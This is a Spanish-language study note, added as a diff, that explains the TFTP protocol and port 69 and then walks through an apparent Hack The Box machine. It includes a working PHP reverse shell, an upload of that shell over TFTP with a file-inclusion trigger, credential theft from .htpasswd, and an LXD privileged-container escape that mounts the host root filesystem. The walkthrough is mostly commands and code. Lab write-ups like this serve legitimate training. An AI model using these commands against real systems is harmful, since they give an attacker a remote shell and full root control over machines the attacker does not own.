@@ -1,0 +1,117 @@
+📌 Es el puerto estándar del protocolo TFTP (Trivial File Transfer Protocol).
+
+    TFTP es un protocolo muy simple para transferir archivos en red.
+
+        Usa UDP
+        No requiere usuario ni contraseña
+        No cifra la información
+        Es mucho más básico que FTP
+
+⚙️ ¿Para qué se usa?
+
+    Principalmente en entornos técnicos:
+
+        🔧 Subir firmware a routers y switches
+        💻 Arranque por red (PXE)
+        📡 Dispositivos embebidos
+        🖥️ Redes internas controladas
+
+    No está pensado para uso público en Internet.
+
+⚠️ ¿Es seguro?
+
+    ❌ No.
+
+        No tiene autenticación
+        No cifra datos
+        Puede permitir subir o descargar archivos si está mal configurado
+
+    Por eso, si en una auditoría aparece el puerto 69 abierto hacia Internet, es una alerta de seguridad.
+
+🔓 Instalación 
+
+    *****************************
+    **  sudo apt install tftp  **
+    *****************************
+
+	Para ver las posibles combinaciones de comando -> man tftp
+
+🎯 Reverse Shell con TFTP
+
+    1. Crear un script para realizar la reverse shell (shell.php)
+		
+	************************************************************************
+	     <?php                                                          
+	     // PHP Reverse Shell                                           
+	     $ip = '<IP_LOCAL>';  // ← Cambia esto por tu IP tun0 (HTB VPN) 
+	     $port = <PORT>;   // ← Cambia esto por el puerto que usarás    
+	                                                                    
+	     $sock = fsockopen($ip, $port);                                 
+	     $proc = proc_open("/bin/sh", [                                 
+			 0 => $sock,                                                    
+			 1 => $sock,                                                    
+			 2 => $sock                                                     
+			 ], $pipes);                                                    
+	     ?>                                                             
+	************************************************************************
+	
+        1.1. Subir el script -> tftp <IP_MÁQUINA> -c put shell.php
+
+        1.2. Ejecutar listener en terminal (mismo directorio) -> nc -lvnp 4444
+
+        1.3. Comprobar los ficheros (en otra terminal nueva) -> curl 'http://{<IP_MÁQUINA>}/?file=/var/lib/tftpboot/shell.php'
+
+        1.4. Script para volver la shell más interactiva -> python3 -c 'import pty;pty.spawn("/bin/bash")'
+
+        1.5. Listamos los ficheros -> ls -a
+
+        1.6. Encontramos la contraseña y usuario -> cat .htpasswd
+
+    2. Conexión al usuario
+
+        su <USER>
+
+    3. Escalada de privilegios
+		
+        3.1. Descargar repositorio imágenes -> git clone https://github.com/saghul/lxd-alpine-builder.git
+	
+        3.2. Ejecutamos script generar .tat.gz -> ./build-alpine
+		
+        3.3. Ejecutar servidor http (en el mismo directorio) -> python3 -m http.server <PORT>
+		
+        3.4. (opcional) Comprobar si el puerto está libre -> sudo lsof -i :<PORT>
+		
+        3.5. En la máquina víctima 
+
+            3.5.1. Descargarnos la imagen -> wget http://<IP_LOCAL>:<PORT>/alpine-minirootfs-3.22.0-x86_64.tar.gz
+
+            3.5.2. Creamos el directorio -> mkdir -p lxd-rootfs/rootfs
+
+            3.5.3. Extraer imagen en el directorio -> tar -xzf ../alpine-minirootfs-3.22.0-x86_64.tar.gz -C rootfs
+
+            3.5.4. Creamos el fichero metadata.yaml
+	
+                cat <<EOF > metadata.yaml
+                architecture: "x86_64"
+                creation_date: $(date +%s)
+                properties:
+                    description: "Alpine 3.22"
+                    os: "Alpine"
+                    release: "3.22"
+                EOF
+
+            3.5.5. Crear fichero .tar.gz con formato LXD válido > tar -czf alpine-lxd.tar.gz metadata.yaml rootfs
+	
+            3.5.6. Importar imagen LXD desde un archivo válido > lxc image import alpine-lxd.tar.gz --alias pwned
+	
+            3.5.7. Ejecución comandos para acceso con privilegios
+	
+                > lxc init pwned esc -c security.privileged=true
+                
+                > lxc config device add esc host-root disk source=/ path=/mnt/root recursive=true
+                
+                > lxc start esc
+                
+                > lxc exec esc /bin/sh
+	
+            3.5.8. Acceso al directorio donde se encuentra la root.flag > cd /mnt/root/root
